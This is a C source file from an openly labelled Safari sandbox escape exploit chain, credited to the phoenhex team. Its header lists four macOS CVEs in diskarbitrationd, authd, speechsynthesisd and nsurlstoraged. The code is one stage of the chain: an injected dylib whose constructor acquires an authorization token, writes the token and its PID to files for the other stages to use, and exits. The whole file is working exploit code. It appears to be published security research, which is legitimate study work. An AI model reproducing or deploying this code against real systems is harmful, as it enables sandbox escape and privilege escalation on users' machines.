// Exploit using following bugs to escape Safari sandbox:
//
// * CVE-2017-2533: TOCTOU in diskarbitrationd
// * CVE-2017-2535: PID reuse logic bug in authd
// * CVE-2017-2534: Arbitrary dylib loading in speechsynthesisd
// * CVE-2017-6977: NULL ptr dereference in nsurlstoraged
//
// by phoenhex team (niklasb & saelo)
//
// see LICENSE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <xpc/xpc.h>
#include <Security/Security.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/sysctl.h>
#include <pwd.h>
#include <mach/mach.h>

#include "workdir.h"
#include "common.h"
#include "proc.h"

AuthorizationExternalForm token;
int token_pid;

void acquire_token() {
  AuthorizationRef auth;
  assert(!AuthorizationCreate( NULL, NULL, kAuthorizationFlagDefaults, &auth));
  assert(!AuthorizationMakeExternalForm(auth, &token));
  token_pid = getpid();
}

__attribute__((constructor))
void _injection() {
  chdir(workdir);
  init("ssd1");
  acquire_token();
  log("Token acquired\n");

  /*
  log("token = ");
  for (int i = 0; i < kAuthorizationExternalFormLength; ++i) {
    if (i && i % 4 == 0) log(" ");
    log("%02x", (int)(unsigned char)token.bytes[i]);
  }
  */
  log("Token PID = %d\n", token_pid);

  write_file("token", token.bytes, kAuthorizationExternalFormLength);
  write_file("token_pid", &token_pid, sizeof token_pid);
  wait_for_file("token_imported");
  log("Cya!\n");
  write_marker("ssd1_done");

  // kill process
  _exit(0);
}
